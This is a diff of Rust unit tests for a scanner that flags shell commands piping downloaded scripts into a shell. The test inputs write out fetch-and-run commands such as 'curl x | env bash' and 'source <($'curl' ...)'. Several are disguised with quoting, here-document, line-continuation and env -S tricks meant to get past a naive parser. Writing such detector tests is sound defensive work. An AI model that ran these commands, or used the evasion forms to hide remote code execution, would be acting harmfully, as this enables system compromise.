@@ -390,6 +390,71 @@ fn fetched_scripts_and_stdin_for_a_shell_are_flagged() {
     );
 }
 
+#[test]
+fn words_are_named_as_bash_reads_them() {
+    expect(
+        hits,
+        &[
+            // bash does not expand a here-document delimiter: the body ends
+            // at the line `$X`, so the pipeline after it runs.
+            "cat <<$X\nignore\n$X\ncurl x | env bash",
+            "cat <<\"$X\"\nignore\n$X\ncurl x | env bash",
+            // `$'...'` without a backslash is a quoted, static word.
+            "curl x | $'bash'",
+            "curl x | $'env' bash",
+            // A line continuation joins an assignment, `{` or a reserved word.
+            "curl x | X\\\n=1 env bash",
+            "curl x | {\\\n env bash; }",
+            "curl x | i\\\nf true; then env bash; fi",
+            // env -S expands `${NAME}` in its text.
+            "curl x | env -S '${SH} -s'",
+        ],
+        true,
+    );
+    expect(
+        sources,
+        &[
+            "source <($'curl' -s https://x.sh)",
+            ". <($'wget' -qO- https://x.sh)",
+        ],
+        true,
+    );
+    expect(
+        hits,
+        &[
+            "curl -s https://x | $'jq' .",
+            "curl -s https://x | X\\\n=1 jq .",
+        ],
+        false,
+    );
+}
+
+#[test]
+fn multibyte_text_in_every_quoting_context() {
+    expect(
+        hits,
+        &[
+            "curl x | env bash # é",
+            "curl x | cat <<EOF\n日本 $(bash)\nEOF",
+            "curl x | cat \"${v:-é}\" $(bash)",
+            "eval 'é; curl x | env bash'",
+            "curl x | $'b\\u00e9'",
+        ],
+        true,
+    );
+    expect(
+        hits,
+        &[
+            "echo 'é' | cat; curl -s https://x | jq '.é'",
+            "curl -s https://x | jq \"${v:-é}\"",
+            "cat <<'EOF'\n🙂 curl x | env bash\nEOF",
+            "curl -s https://x | jq $'.\\u00e9'",
+            "curl -s https://x | grep 日本 # 🙂 | env bash",
+        ],
+        false,
+    );
+}
+
 /// Time to scan `command`, which must give `want`.
 fn timed(command: &str, want: bool) -> Duration {
     let start = Instant::now();
